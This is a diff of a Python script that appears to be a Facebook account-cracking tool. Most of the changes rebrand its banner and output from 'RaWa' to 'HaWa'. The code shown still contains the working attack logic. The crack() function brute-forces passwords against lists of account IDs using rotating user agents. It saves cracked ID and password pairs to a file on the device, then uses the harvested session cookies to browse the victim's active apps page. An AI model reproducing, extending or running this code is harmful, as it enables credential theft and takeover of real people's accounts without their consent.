@@ -287,17 +287,17 @@ def back():
         menu()
 #LOGO
 def banner():
-        print("""\x1b[1;96m \033[93m
+        print("""\033[93m
         
-ᴛᴏᴏʟ ʙʏ @ʟ4ᴍ_ʀᴀᴡᴀ
------------------------------------------------------------
-＜￣｀ヽ、　　　　　　／￣＞
-　ゝ、　　＼　／⌒ヽ,ノ 　/´                                     　　　ゝ、　`（ ( ͡° ͜ʖ ͡°) ／
-　　 　　>　 　 　,)
-　　　　　∠_,,,/
------------------------------------------------------------
-𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 : @𝗹𝟰𝗺_𝗿𝗮𝘄𝗮
-𝘝𝘌𝘚𝘐𝘖𝘕 : 𝘝2           
+       __  __     _       __     
+   / / / /___ | |     / /___ _
+  / /_/ / __ `/ | /| / / __ `/
+ / __  / /_/ /| |/ |/ / /_/ / 
+/_/ /_/\__,_/ |__/|__/\__,_/ 
+------------------------------
+TOOL UPDATE BY Hawa🥶
+VESION 1.3🌪️
+STATUS : FREE😊        
 
 
 """)
@@ -306,7 +306,7 @@ banner()
 #MENU
 def menu():
        	print()
-        print(f'  [ 1 ] CRACK FILE')
+        print('\x1b[0;95m[ 1 ] CRACK FILE')
         #print(f'\x1b[1;92m╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍‒\x1b[1;94m╍╌╍╌╍\x1b[1;97m╌╍╌╍╍\x1b[1;96m╌╍╌╍‒╍\x1b[1;93m╌╍╌╍‒╍\x1b[1;91m╌╍╌╍╌╍\x1b[1;92m╌╍╌╍╌╍')
 
         _____BRADOSTI_____ = input('  HALBZHERA : ')
@@ -492,7 +492,7 @@ def passwrd():
 def crack(idf,pwv):
         global loop,ok,cp
         bo = random.choice([m,k,h,b,u,x])
-        sys.stdout.write(f"\r\033[1;30m{bo} [RaWa] \x1b[1;91m{h}{loop}|{len(id)} | \x1b[1;96mOK:-{h}{ok} ")
+        sys.stdout.write(f"\r \x1b[0;95m[\x1b[38;5;231mHaWa🥶🖤\x1b[38;5;248m : {loop}😍{len(id)} \x1b[0;90m[{ok}] \x1b[38;5;226m \x1b[1;34m{'{:.0%}'.format(loop/float(len(id)))}  "),
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua2 = random.choice(ugen2)
@@ -546,9 +546,9 @@ def crack(idf,pwv):
                                 ok+=1
                                 coki=po.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])        
-                                print(f'\r\x1b[1;90m[RAWA-OK]\x1b[1;91m   {idf} | \x1b[0;96m{pw} | \x1b[1;96m{kuki}')
+                                print(f'\r\033[41m\x1b[1;97m[HAWA🌪️😍] {idf}|{pw} ')
                                 open('/sdcard/HaWa-𝑂𝐾.txt','a').write(idf+' | '+pw+'\n')
-                                cek_NIK(kuki)
+                                cek_SURCHY(kuki)
                                 break
                         else:
                                 continue
@@ -556,7 +556,14 @@ def crack(idf,pwv):
                         time.sleep(10)
         loop+=1
 
-def cek_NIK(kuki):
+
+def chek():
+    os.system('clear')
+    banner()
+    menu()
+
+
+def cek_SURCHY(kuki):
  session = requests.Session()
  w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
  sop = bs4.BeautifulSoup(w,"html.parser")
@@ -576,10 +583,6 @@ def cek_NIK(kuki):
    print ("\r%s  \033[0m  %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
  except AttributeError:
   print ("\r    %s \033[0mcookie invalid"%(M))
-def chek():
-    os.system('clear')
-    banner()
-    menu()
     
 
 
